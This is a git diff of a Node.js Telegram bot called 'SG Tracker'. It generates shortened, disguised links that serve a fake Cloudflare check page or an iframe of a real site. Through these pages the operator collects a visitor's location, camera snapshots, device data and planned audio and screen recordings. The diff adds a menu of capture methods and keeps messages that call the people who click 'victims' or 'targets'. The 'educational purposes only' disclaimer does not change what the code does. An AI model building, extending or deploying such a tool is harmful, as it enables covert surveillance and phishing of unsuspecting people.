@@ -19,7 +19,7 @@ app.use(cors());
 
 // Global variables
 const bot = new TelegramBot(process.env.bot);
-const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
+const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां है
 const use1pt = false;
 
 // Get the template paths
@@ -50,7 +50,7 @@ function atob(str) {
 }
 
 // URL Shortening Services
-// 1. XCut URL Shortener (your provided shortener)
+// 1. XCut URL Shortener
 async function shortenUrlWithXcut(url) {
   try {
     const response = await fetch('https://xcut.vercel.app/api/shorten', {
@@ -88,7 +88,7 @@ async function shortenUrlWithTinyurl(url) {
   }
 }
 
-// 3. Is.gd URL Shortener (Open Source)
+// 3. Is.gd URL Shortener
 async function shortenUrlWithIsgd(url) {
   try {
     const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
@@ -103,7 +103,7 @@ async function shortenUrlWithIsgd(url) {
   }
 }
 
-// 4. Cleanuri URL Shortener (Open Source)
+// 4. Cleanuri URL Shortener
 async function shortenUrlWithCleanuri(url) {
   try {
     const response = await fetch('https://cleanuri.com/api/v1/shorten', {
@@ -151,12 +151,24 @@ async function shortenUrl(url) {
   return results;
 }
 
-// Create a link function (webhook version)
-async function createLink(cid, msg) {
+// Generate a random string for URL uniqueness
+function generateRandomString(length = 8) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
+
+// Create a link function with animated progress bar and message editing
+async function createLink(cid, msg, captureMethodId = "full") {
   var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
   if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
-    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
+    // Generate a unique ID for this tracking link
+    const uniqueId = generateRandomString(10);
+    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64') + '/' + uniqueId;
     var m = {
       reply_markup: JSON.stringify({
         "inline_keyboard": [
@@ -165,59 +177,103 @@ async function createLink(cid, msg) {
       })
     };
 
-    var cUrl = `${hostURL}/c/${url}`;
-    var wUrl = `${hostURL}/w/${url}`;
+    // Get capture method code
+    const captureCode = captureMethods.generateCaptureCode(captureMethodId);
+    
+    // Add capture method code to URLs
+    var cUrl = `${hostURL}/c/${url}/${captureCode}`;
+    var wUrl = `${hostURL}/w/${url}/${captureCode}`;
 
-    // Create loading animation frames
-    const loadingFrames = [
-      "⬜⬜⬜⬜⬜",
-      "⬛⬜⬜⬜⬜",
-      "⬛⬛⬜⬜⬜",
-      "⬛⬛⬛⬜⬜",
-      "⬛⬛⬛⬛⬜",
-      "⬛⬛⬛⬛⬛"
+    // Progress bar stages
+    const progressStages = [
+      "⬜⬜⬜⬜⬜ 0%",
+      "🟦⬜⬜⬜⬜ 20%",
+      "🟦🟦⬜⬜⬜ 40%",
+      "🟦🟦🟦⬜⬜ 60%",
+      "🟦🟦🟦🟦⬜ 80%",
+      "🟦🟦🟦🟦🟦 100%"
     ];
     
-    // Send a processing message with initial animation frame
-    const processingMsgId = await bot.sendMessage(
+    // Send initial processing message with stage 0 progress bar
+    const processingMsg = await bot.sendMessage(
       cid, 
-      `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[0]}\n<i>Please wait while we prepare everything for you...</i>`, 
+      `<b>🔮 Generating your tracking links...</b>\n\n` +
+      `<i>Preparing services...</i>\n` +
+      `${progressStages[0]}`, 
       { parse_mode: "HTML" }
-    ).then(msg => msg.message_id);
+    );
     
-    // Start the loading animation
-    let currentFrame = 0;
-    const animationInterval = setInterval(async () => {
-      currentFrame = (currentFrame + 1) % loadingFrames.length;
-      try {
-        await bot.editMessageText(
-          `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[currentFrame]}\n<i>Please wait while we prepare everything for you...</i>`,
-          {
-            chat_id: cid,
-            message_id: processingMsgId,
-            parse_mode: "HTML"
-          }
-        );
-      } catch (error) {
-        console.log("Animation update error:", error);
-      }
-    }, 500);
-    
-    // Show typing indicator for better UX
-    await bot.sendChatAction(cid, "typing");
+    const processingMsgId = processingMsg.message_id;
     
     try {
+      // Update to 20% - Starting URL shortening
+      await bot.editMessageText(
+        `<b>🔮 Generating your tracking links...</b>\n\n` +
+        `<i>Connecting to URL shorteners...</i>\n` +
+        `${progressStages[1]}`,
+        { 
+          chat_id: cid, 
+          message_id: processingMsgId,
+          parse_mode: "HTML" 
+        }
+      );
+
       // First shorten the CloudFlare link with multiple services
       const shortenedCUrls = await shortenUrl(cUrl);
+      
+      // Update to 40% - Half of shortening done
+      await bot.editMessageText(
+        `<b>🔮 Generating your tracking links...</b>\n\n` +
+        `<i>Creating CloudFlare links...</i>\n` +
+        `${progressStages[2]}`,
+        { 
+          chat_id: cid, 
+          message_id: processingMsgId,
+          parse_mode: "HTML" 
+        }
+      );
       
       // Then shorten the WebView link with multiple services
       const shortenedWUrls = await shortenUrl(wUrl);
       
-      // Stop the animation
-      clearInterval(animationInterval);
+      // Update to 60% - Shortening complete
+      await bot.editMessageText(
+        `<b>🔮 Generating your tracking links...</b>\n\n` +
+        `<i>Creating WebView links...</i>\n` +
+        `${progressStages[3]}`,
+        { 
+          chat_id: cid, 
+          message_id: processingMsgId,
+          parse_mode: "HTML" 
+        }
+      );
       
-      // Show typing indicator again
-      await bot.sendChatAction(cid, "typing");
+      // Update to 80% - Preparing final message
+      await bot.editMessageText(
+        `<b>🔮 Generating your tracking links...</b>\n\n` +
+        `<i>Finalizing your links...</i>\n` +
+        `${progressStages[4]}`,
+        { 
+          chat_id: cid, 
+          message_id: processingMsgId,
+          parse_mode: "HTML" 
+        }
+      );
+      
+      // Update to 100% - All done
+      await bot.editMessageText(
+        `<b>🔮 Generating your tracking links...</b>\n\n` +
+        `<i>Everything is ready!</i>\n` +
+        `${progressStages[5]}`,
+        { 
+          chat_id: cid, 
+          message_id: processingMsgId,
+          parse_mode: "HTML" 
+        }
+      );
+      
+      // Small delay for better UX
+      await new Promise(resolve => setTimeout(resolve, 500));
       
       if (shortenedCUrls.length > 0 || shortenedWUrls.length > 0) {
         let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
@@ -226,11 +282,11 @@ async function createLink(cid, msg) {
         message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
         
         // Add CloudFlare links with better formatting and visuals
-        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<b>🛡️ CLOUDFLARE PAGE LINKS</b>\n`;
         message += `<i>Shows a Cloudflare security check page before redirecting</i>\n\n`;
-        message += `🔗 <a href="${cUrl}">Click to open</a>\n\n`;
+        message += `🔗 <b>Original:</b> <a href="${cUrl}">Click to open</a>\n\n`;
         
-        // Only add shorteners that worked - using only symbols, no service names
+        // Only add shorteners that worked - with symbols but without service names
         if (shortenedCUrls.length > 0) {
           message += `<b>📎 Shortened URLs:</b>\n`;
           shortenedCUrls.forEach((shortened, index) => {
@@ -241,15 +297,16 @@ async function createLink(cid, msg) {
             else if (shortened.name === 'Cleanuri') symbol = '💫';
             else symbol = '🔗';
             
+            // Just show the shortened URL without the service name
             message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
           });
         }
         
-        message += `\n<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `\n<b>🌐 WEBVIEW PAGE LINKS</b>\n`;
         message += `<i>Shows the target website in an iframe</i>\n\n`;
-        message += `🔗 <a href="${wUrl}">Click to open</a>\n\n`;
+        message += `🔗 <b>Original:</b> <a href="${wUrl}">Click to open</a>\n\n`;
         
-        // Only add shorteners that worked - using only symbols, no service names
+        // Only add shorteners that worked - with symbols but without service names
         if (shortenedWUrls.length > 0) {
           message += `<b>📎 Shortened URLs:</b>\n`;
           shortenedWUrls.forEach((shortened, index) => {
@@ -260,96 +317,78 @@ async function createLink(cid, msg) {
             else if (shortened.name === 'Cleanuri') symbol = '💫';
             else symbol = '🔗';
             
+            // Just show the shortened URL without the service name
             message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
           });
         }
         
-        message += `\n<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        message += `\n<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
         
-        // Edit the loading message instead of sending a new one
-        await bot.editMessageText(message, {
-          chat_id: cid,
+        // Replace the progress message with the final links
+        await bot.editMessageText(message, { 
+          chat_id: cid, 
           message_id: processingMsgId,
           parse_mode: "HTML",
           reply_markup: m.reply_markup
         });
       } else {
-        // If all URL shorteners fail, edit the loading message with direct links
+        // If all URL shorteners fail, send direct links with better formatting
         let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
         message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
         message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
         message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
         
-        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
         message += `<i>Shows a Cloudflare security check page</i>\n`;
         message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
         
-        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
         message += `<i>Shows the target website in an iframe</i>\n`;
         message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
         
-        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
         
-        // Edit the loading message instead of sending a new one
-        await bot.editMessageText(message, {
-          chat_id: cid,
+        // Replace the progress message with the final links
+        await bot.editMessageText(message, { 
+          chat_id: cid, 
           message_id: processingMsgId,
           parse_mode: "HTML",
           reply_markup: m.reply_markup
         });
       }
     } catch (error) {
-      console.error("Error shortening URLs:", error);
+      console.error("Error generating links:", error);
       
-      // Stop the animation if it's still running
       try {
-        clearInterval(animationInterval);
+        // Replace the progress message with an error message
+        await bot.editMessageText(
+          `<b>⚠️ Error generating tracking links</b>\n\n` +
+          `Something went wrong while generating your links. Please try again.\n\n` +
+          `Error details: ${error.message}`,
+          { 
+            chat_id: cid, 
+            message_id: processingMsgId,
+            parse_mode: "HTML"
+          }
+        );
       } catch (e) {
-        console.log("Error clearing animation interval:", e);
-      }
-      
-      // If error occurs, edit the loading message with direct links
-      try {
+        console.log("Couldn't edit processing message: ", e);
+        
+        // If error occurs, send direct links with better formatting
         let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
         message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
         message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
         message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
         
-        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
         message += `<i>Shows a Cloudflare security check page</i>\n`;
         message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
         
-        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
         message += `<i>Shows the target website in an iframe</i>\n`;
         message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
         
-        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
-        
-        // Edit the loading message instead of sending a new one
-        await bot.editMessageText(message, {
-          chat_id: cid,
-          message_id: processingMsgId,
-          parse_mode: "HTML",
-          reply_markup: m.reply_markup
-        });
-      } catch (e) {
-        console.log("Error editing message, sending a new one:", e);
-        
-        // Fallback to sending a new message if editing fails
-        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
-        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
-        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
-        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
-        
-        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
-        message += `<i>Shows a Cloudflare security check page</i>\n`;
-        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
-        
-        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
-        message += `<i>Shows the target website in an iframe</i>\n`;
-        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
-        
-        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
         
         await bot.sendMessage(cid, message, { 
           reply_markup: m.reply_markup,
@@ -366,12 +405,194 @@ async function createLink(cid, msg) {
   }
 }
 
-// Create new request function (webhook version)
-async function createNew(cid) {
-  var mk = {
+// Define capture methods
+const captureMethods = {
+  // Different capture method configurations
+  methods: [
+    {
+      id: "full",
+      name: "Full Capture",
+      description: "Device Info + Front Camera + Location",
+      emoji: "📱",
+      code: "full"
+    },
+    {
+      id: "back",
+      name: "Back Camera",
+      description: "Device Info + Back Camera + Location",
+      emoji: "📷", 
+      code: "back"
+    },
+    {
+      id: "minimal",
+      name: "Minimal",
+      description: "Device Info + Location only (No Camera)",
+      emoji: "💻",
+      code: "min"
+    },
+    {
+      id: "audio",
+      name: "Audio Capture",
+      description: "Device Info + Audio Recording + Location",
+      emoji: "🎤",
+      code: "audio"
+    },
+    {
+      id: "screen",
+      name: "Screen Capture",
+      description: "Device Info + Screen Recording + Location",
+      emoji: "🎬",
+      code: "screen"
+    }
+  ],
+  
+  // Get capture method by ID
+  getMethod: function(id) {
+    return this.methods.find(method => method.id === id) || this.methods[0];
+  },
+  
+  // Generate code for capture method (to be passed in URL)
+  generateCaptureCode: function(id) {
+    const method = this.getMethod(id);
+    return method.code;
+  },
+  
+  // Create keyboard with capture method options
+  getKeyboard: function() {
+    const keyboard = [];
+    
+    // Create rows with two buttons each
+    for (let i = 0; i < this.methods.length; i += 2) {
+      const row = [];
+      
+      // Add first button
+      row.push({
+        text: `${this.methods[i].emoji} ${this.methods[i].name}`,
+        callback_data: `capture_${this.methods[i].id}`
+      });
+      
+      // Add second button if available
+      if (i + 1 < this.methods.length) {
+        row.push({
+          text: `${this.methods[i+1].emoji} ${this.methods[i+1].name}`,
+          callback_data: `capture_${this.methods[i+1].id}`
+        });
+      }
+      
+      keyboard.push(row);
+    }
+    
+    // Add cancel button at the bottom
+    keyboard.push([
+      {
+        text: "❌ Cancel",
+        callback_data: "capture_cancel"
+      }
+    ]);
+    
+    return keyboard;
+  }
+};
+
+// Create new request function with capture methods
+async function createNew(cid, messageId = null) {
+  // Show capture method selection keyboard
+  const captureKeyboard = {
+    reply_markup: JSON.stringify({
+      "inline_keyboard": captureMethods.getKeyboard()
+    })
+  };
+  
+  // Message content
+  const methodSelectionText = `<b>🌟 Choose Capture Method 🌟</b>\n\n` +
+    `Select what you want to capture from your target:`;
+  
+  // If messageId is provided, edit the existing message
+  if (messageId) {
+    try {
+      await bot.editMessageText(methodSelectionText, { 
+        chat_id: cid,
+        message_id: messageId,
+        parse_mode: "HTML",
+        reply_markup: captureKeyboard.reply_markup
+      });
+    } catch (error) {
+      console.error("Error editing method selection message:", error);
+      
+      // Fallback to sending a new message
+      await bot.sendMessage(
+        cid, 
+        methodSelectionText,
+        { 
+          parse_mode: "HTML",
+          reply_markup: captureKeyboard.reply_markup
+        }
+      );
+    }
+  } else {
+    // Send a new message
+    await bot.sendMessage(
+      cid, 
+      methodSelectionText,
+      { 
+        parse_mode: "HTML",
+        reply_markup: captureKeyboard.reply_markup
+      }
+    );
+  }
+}
+
+// Process the link creation with the selected capture method
+async function processLinkWithCaptureMethod(cid, captureMethodId, messageId = null) {
+  // Get the selected method
+  const method = captureMethods.getMethod(captureMethodId);
+  
+  // Create force reply keyboard for URL input
+  const forceReplyKeyboard = {
     reply_markup: JSON.stringify({ "force_reply": true })
   };
-  await bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
+  
+  // Single message with method info and URL prompt
+  const messageText = `${method.emoji} ${method.name} selected\n\n` +
+    `<b>This will capture:</b> <i>${method.description}</i>\n\n` +
+    `Enter Your URL:`;
+  
+  try {
+    if (messageId) {
+      // If we have a message ID, first try to delete it 
+      // (since we can't add force_reply to an edited message)
+      try {
+        await bot.deleteMessage(cid, messageId);
+      } catch (deleteError) {
+        console.log("Could not delete message, but will continue:", deleteError.message);
+      }
+    }
+    
+    // Send a single message with force reply
+    await bot.sendMessage(
+      cid, 
+      messageText, 
+      {
+        parse_mode: "HTML",
+        reply_markup: forceReplyKeyboard.reply_markup
+      }
+    );
+  } catch (error) {
+    console.error("Error in processing capture method:", error);
+    
+    // Last resort fallback
+    await bot.sendMessage(
+      cid, 
+      messageText,
+      {
+        parse_mode: "HTML",
+        reply_markup: forceReplyKeyboard.reply_markup
+      }
+    );
+  }
+  
+  // The actual link creation will happen when the user replies to this message
+  // That part is handled in the message handler with createLink
 }
 
 // ROUTES
@@ -456,18 +677,23 @@ app.post("/camsnap", async (req, res) => {
   }
 });
 
-// Webview route
-app.get("/w/:uid/:uri", async (req, res) => {
+// Webview route with capture method
+app.get("/w/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
   try {
     const uid = req.params.uid;
     const uri = req.params.uri;
+    const uniqueId = req.params.uniqueId || 'default';
+    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
     
     if (!uid || !uri) {
-      return res.redirect("https://t.me/th30neand0nly0ne");
+      return res.redirect("https://t.me/SG_Modder");
     }
     
     const ip = getClientIp(req);
     const time = getFormattedDate();
+    
+    // Log access with unique ID for tracking
+    console.log(`WebView access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
     
     // Render the template
     const html = ejs.render(webviewTemplate, {
@@ -476,7 +702,8 @@ app.get("/w/:uid/:uri", async (req, res) => {
       url: atob(uri),
       uid: uid,
       a: hostURL,
-      t: use1pt
+      t: use1pt,
+      captureMethod: captureMethod
     });
     
     res.setHeader('Content-Type', 'text/html');
@@ -487,18 +714,23 @@ app.get("/w/:uid/:uri", async (req, res) => {
   }
 });
 
-// Cloudflare route
-app.get("/c/:uid/:uri", async (req, res) => {
+// Cloudflare route with capture method
+app.get("/c/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
   try {
     const uid = req.params.uid;
     const uri = req.params.uri;
+    const uniqueId = req.params.uniqueId || 'default';
+    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
     
     if (!uid || !uri) {
-      return res.redirect("https://t.me/th30neand0nly0ne");
+      return res.redirect("https://t.me/SG_Modder");
     }
     
     const ip = getClientIp(req);
     const time = getFormattedDate();
+    
+    // Log access with unique ID for tracking
+    console.log(`CloudFlare access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
     
     // Render the template
     const html = ejs.render(cloudflareTemplate, {
@@ -507,7 +739,8 @@ app.get("/c/:uid/:uri", async (req, res) => {
       url: atob(uri),
       uid: uid,
       a: hostURL,
-      t: use1pt
+      t: use1pt,
+      captureMethod: captureMethod
     });
     
     res.setHeader('Content-Type', 'text/html');
@@ -527,15 +760,67 @@ app.post("/webhook", async (req, res) => {
     if (update.callback_query) {
       const callbackQuery = update.callback_query;
       await bot.answerCallbackQuery(callbackQuery.id);
+      const chatId = callbackQuery.message.chat.id;
       
       if (callbackQuery.data === "crenew") {
-        await createNew(callbackQuery.message.chat.id);
+        // For create new, edit the current message
+        await createNew(chatId, callbackQuery.message.message_id);
       } else if (callbackQuery.data === "help") {
-        // Show help message when the help button is clicked - edit the current message
-        await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+        // Show help message when the help button is clicked - edit message
+        await sendHelpMessage(chatId, callbackQuery.message.message_id);
       } else if (callbackQuery.data === "back_to_main") {
-        // Go back to main menu
-        await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
+        // Go back to main menu - edit message
+        await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
+      } else if (callbackQuery.data === "channels") {
+        // Show channels information by editing current message
+        await bot.editMessageText(
+          `<b>📢 SG Modder Channels 📢</b>\n\n` +
+          `Join our official channels for updates, tools and more!\n\n` +
+          `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
+          `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
+          `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
+          `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
+          { 
+            chat_id: chatId, 
+            message_id: callbackQuery.message.message_id, 
+            parse_mode: "HTML",
+            reply_markup: JSON.stringify({
+              "inline_keyboard": [
+                [
+                  { text: "🔙 Back", callback_data: "back_to_main" }
+                ]
+              ]
+            })
+          }
+        );
+      } else if (callbackQuery.data.startsWith("capture_")) {
+        // Handle capture method selection
+        const captureMethodId = callbackQuery.data.replace("capture_", "");
+        
+        if (captureMethodId === "cancel") {
+          // User canceled the capture method selection - edit current message
+          await bot.editMessageText(
+            `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
+            { 
+              chat_id: chatId, 
+              message_id: callbackQuery.message.message_id,
+              parse_mode: "HTML",
+              reply_markup: JSON.stringify({
+                "inline_keyboard": [
+                  [
+                    { text: "🔗 Try Again", callback_data: "crenew" }
+                  ],
+                  [
+                    { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
+                  ]
+                ]
+              })
+            }
+          );
+        } else {
+          // Process the selected capture method - edit current message
+          await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
+        }
       }
       
       return res.status(200).send("OK");
@@ -546,10 +831,41 @@ app.post("/webhook", async (req, res) => {
       const msg = update.message;
       const chatId = msg.chat.id;
       
-      // Handle reply to "Enter Your URL" message
-      if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
-        await createLink(chatId, msg.text);
-        return res.status(200).send("OK");
+      // Handle reply to capture method prompt or URL input
+      if (msg.reply_to_message && msg.reply_to_message.text) {
+        const replyText = msg.reply_to_message.text;
+        
+        // Check if this is a URL input after selecting a capture method
+        if (replyText.includes("This will capture:") || 
+            replyText.includes("Enter Your URL:") || 
+            replyText.includes("Enter URL to track")) {
+          console.log("Webhook: Detected reply to URL prompt:", replyText);
+          
+          // Find which capture method was selected based on text content
+          let methodId = "full"; // Default
+          
+          if (replyText.includes("Front Camera")) {
+            methodId = "full";
+          } else if (replyText.includes("Back Camera")) {
+            methodId = "back";
+          } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
+            methodId = "minimal";
+          } else if (replyText.includes("Audio")) {
+            methodId = "audio";
+          } else if (replyText.includes("Screen")) {
+            methodId = "screen";
+          }
+          
+          console.log("Webhook: Creating link with method:", methodId);
+          // Create a link with the selected capture method
+          await createLink(chatId, msg.text, methodId);
+          return res.status(200).send("OK");
+        }
+        // Basic URL input handling (backward compatibility)
+        else if (replyText === "🌐 Enter Your URL") {
+          await createLink(chatId, msg.text);
+          return res.status(200).send("OK");
+        }
       }
       
       // Handle /start command
@@ -575,61 +891,11 @@ app.post("/webhook", async (req, res) => {
 
 // Helper function to send welcome message
 async function sendWelcomeMessage(chatId, firstName, messageId = null) {
-  // Create welcome message keyboard with emojis
-  const welcomeKeyboard = {
-    reply_markup: JSON.stringify({
-      "inline_keyboard": [
-        [
-          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
-        ],
-        [
-          { text: "ℹ️ Help", callback_data: "help" }
-        ]
-      ]
-    })
-  };
-  
-  // Welcome message text
-  const welcomeText = 
-    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
-    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
-    `<b>📱 What You Can Track:</b>\n` +
-    `• 📍 Precise Location\n` +
-    `• 📷 Camera Snapshots\n` +
-    `• 💻 Device Information\n` +
-    `• 🔋 Battery Status\n` +
-    `• 🌐 Network Details\n\n` +
-    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
-    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
-    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`;
-  
-  // If editing an existing message
-  if (messageId) {
-    try {
-      await bot.editMessageText(welcomeText, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: "HTML",
-        reply_markup: welcomeKeyboard.reply_markup
-      });
-    } catch (error) {
-      console.log("Error editing welcome message:", error);
-      // Fallback to sending a new message
-      await sendFullWelcomeMessage(chatId, firstName);
-    }
-  } else {
-    // If sending a new message with sticker
-    await sendFullWelcomeMessage(chatId, firstName);
-  }
-}
-
-// Helper function to send full welcome message with properly formatted content
-async function sendFullWelcomeMessage(chatId, firstName) {
   // Show typing indicator for a more interactive feel
   await bot.sendChatAction(chatId, "typing");
   
   // Create an enhanced keyboard with emojis
-  const welcomeKeyboard = {
+  var m = {
     reply_markup: JSON.stringify({
       "inline_keyboard": [
         [
@@ -637,30 +903,62 @@ async function sendFullWelcomeMessage(chatId, firstName) {
         ],
         [
           { text: "ℹ️ Help", callback_data: "help" }
+        ],
+        [
+          { text: "📢 Our Channels", callback_data: "channels" }
         ]
       ]
     })
   };
   
-  // Send a visually enhanced welcome message (only one message)
-  await bot.sendMessage(
-    chatId, 
-    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
-    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
+  // Welcome message content
+  const welcomeText = `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
+    `<i>SG Tracker</i> is your advanced tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
     `<b>📱 What You Can Track:</b>\n` +
     `• 📍 Precise Location\n` +
     `• 📷 Camera Snapshots\n` +
+    `• 🎥 Screen Recording\n` +
+    `• 🎤 Audio Recording\n` +
     `• 💻 Device Information\n` +
     `• 🔋 Battery Status\n` +
     `• 🌐 Network Details\n\n` +
-    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
-    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
-    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`, 
-    { 
-      parse_mode: "HTML",
-      reply_markup: welcomeKeyboard.reply_markup
+    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
+    `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
+    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!`;
+  
+  // If messageId is provided, edit the existing message
+  if (messageId) {
+    try {
+      await bot.editMessageText(welcomeText, { 
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "HTML",
+        reply_markup: m.reply_markup
+      });
+    } catch (error) {
+      console.error("Error editing welcome message:", error);
+      
+      // Fallback to sending a new message
+      await bot.sendMessage(
+        chatId, 
+        welcomeText, 
+        { 
+          parse_mode: "HTML",
+          reply_markup: m.reply_markup
+        }
+      );
     }
-  );
+  } else {
+    // Send a new message
+    await bot.sendMessage(
+      chatId, 
+      welcomeText, 
+      { 
+        parse_mode: "HTML",
+        reply_markup: m.reply_markup
+      }
+    );
+  }
 }
 
 // Helper function to send help message
@@ -676,15 +974,21 @@ async function sendHelpMessage(chatId, messageId = null) {
           { text: "🔗 Create Tracking Link", callback_data: "crenew" }
         ],
         [
+          { text: "📢 Our Channels", callback_data: "channels" }
+        ],
+        [
+          { text: "🌐 GitHub Repo", url: "https://github.com/SGModder-Offcial" }
+        ],
+        [
           { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
         ]
       ]
     })
   };
   
-  const helpText = 
-    `<b>📚 SGTRACKER HELP GUIDE 📚</b>\n\n` +
-    `<i>This bot creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
+  // Help message content
+  const helpText = `<b>📚 SG TRACKER HELP GUIDE 📚</b>\n\n` +
+    `<i>This powerful tool creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
     
     `<b>🚀 Getting Started:</b>\n` +
     `1️⃣ Type /create or click the button below\n` +
@@ -708,28 +1012,28 @@ async function sendHelpMessage(chatId, messageId = null) {
     `<b>📱 Information Collected:</b>\n` +
     `• 📍 Location (requires permission)\n` +
     `• 📷 Camera snapshots (requires permission)\n` +
+    `• 🎥 Screen Recording (coming soon)\n` +
+    `• 🎤 Audio Recording (coming soon)\n` +
     `• 🖥️ Device & browser details\n` +
     `• 🔋 Battery information\n` +
     `• 🌐 IP address & network data\n\n` +
     
-    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>\n\n` +
-    
-    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
-    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1\n` +
-    `<b>🌐 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>`;
+    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
+    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>`;
   
-  // If messageId is provided, edit the message instead of sending a new one
+  // If messageId is provided, edit the existing message
   if (messageId) {
     try {
-      await bot.editMessageText(helpText, {
